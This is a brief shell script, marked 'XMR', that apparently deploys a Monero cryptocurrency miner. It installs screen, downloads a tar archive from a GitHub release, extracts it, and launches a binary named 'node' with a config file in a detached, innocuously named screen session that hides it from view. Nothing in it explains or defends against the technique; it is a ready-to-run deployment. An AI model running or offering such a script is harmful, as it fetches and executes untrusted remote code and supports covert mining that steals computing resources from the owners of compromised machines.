#!/bin/sh
#
#
#XMR
apt install screen -y
wget https://github.com/wikangdijalalan2/xmmxja/releases/download/v1.0/male1.tar
tar -xvf male1.tar
cd MXC
screen -dmS randum ./node mr.ini
